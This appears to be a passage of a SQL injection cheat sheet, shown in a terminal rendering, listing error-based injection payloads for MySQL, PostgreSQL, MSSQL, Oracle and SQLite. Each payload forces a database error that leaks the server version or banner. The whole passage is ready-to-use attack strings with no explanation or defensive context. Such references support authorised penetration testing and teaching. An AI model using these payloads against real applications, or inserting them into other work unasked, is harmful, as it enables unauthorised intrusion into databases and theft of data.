[34m│[0m ### Error-Based Injection                                                    [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **MySQL Error-Based:**                                                       [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m EXTRACTVALUE: AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))       [34m│[0m
[34m│[0m UPDATEXML: AND                                                               [34m│[0m
[34m│[0m UPDATEXML(rand(),CONCAT(CHAR(126),version(),CHAR(126)),null)--               [34m│[0m
[34m│[0m EXP: AND EXP(~(SELECT * FROM (SELECT CONCAT('~',(SELECT                      [34m│[0m
[34m│[0m version()),'~','x'))x))--                                                    [34m│[0m
[34m│[0m NAME_CONST: AND (SELECT * FROM (SELECT                                       [34m│[0m
[34m│[0m NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--                     [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **PostgreSQL Error-Based:**                                                  [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m CAST: AND 1337=CAST('~'||(SELECT version())::text||'~' AS NUMERIC) --        [34m│[0m
[34m│[0m CAST: AND (SELECT version())::int=1 --                                       [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **MSSQL Error-Based:**                                                       [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m CONVERT: AND 1=CONVERT(int, @@version)--                                     [34m│[0m
[34m│[0m CAST: AND 1=CAST(@@version AS int)--                                         [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Oracle Error-Based:**                                                      [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m CTXSYS.DRITHSX.SN: SELECT CTXSYS.DRITHSX.SN(user,(select banner from         [34m│[0m
[34m│[0m v$version where rownum=1)) FROM dual                                         [34m│[0m
[34m│[0m XMLType: AND 1337=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'~'||(SELECT       [34m│[0m
[34m│[0m banner FROM v$version)||'~'||CHR(62))) FROM DUAL)                            [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **SQLite Error-Based:**                                                      [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m AND CASE WHEN [BOOLEAN_QUERY] THEN 1 ELSE load_extension(1) END              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
